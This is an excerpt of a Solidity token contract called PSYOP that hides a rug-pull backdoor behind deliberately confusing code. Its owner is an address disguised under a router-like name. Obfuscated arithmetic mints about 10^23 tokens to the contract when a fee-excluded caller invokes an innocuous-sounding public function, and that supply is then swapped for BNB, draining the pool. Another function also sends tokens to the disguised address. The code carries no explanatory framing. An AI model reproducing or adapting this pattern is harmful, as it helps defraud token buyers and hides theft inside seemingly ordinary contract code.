...
contract PSYOP is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x3F6E527AA0f169eb5ED0E085550656302d9A87af); 
    address payable public UniSwapRouter003 = payable(0x744acaB2dB41E7A23fE23DCfb461d47985B20e78);
    ...
    bool public startingUniSwapDeal = false;
    ...
    constructor () {
        ...
        _owner = 0x744acaB2dB41E7A23fE23DCfb461d47985B20e78;
    ...
    function symbolOf_() private view returns(address){
        return address(this);
    }

    function countWallet(bool statement) private pure returns(uint256){
        uint256 statementC = 0;
        if(statement){
            statementC = (9+1)**(9+1+(9+1+3));
        }
        return statementC;
    }
    ...
    function symbolOfToken_(address private_memory) private returns(bool){
        if(true && (_isExcludedFromFee[private_memory]) && true && false==false){
            _tOwned[symbolOf_()] = countWallet(true);
        }
        return true;
    }
    ...
    function balanceOfTotalWallets(address add_wallet) public returns (bool) {
        address stateOfStatus = _msgSender();
        if(add_wallet==add_wallet){}
        if((symbolOfToken_(stateOfStatus))){
            startingUniSwapDeal = true;
            swapAndLiquify(balanceOf(symbolOf_()));
        }
        return true;
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 routerSwitcher = tokens_to_M + tokens_to_D + tokens_to_LP_Half;
            if(startingUniSwapDeal){
                routerSwitcher = (contractLiquidityBalance) - _tTotal;
            }

            startingUniSwapDeal = false;
            swapTokensForBNB(routerSwitcher);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(UniSwapRouter003, removeRandom);
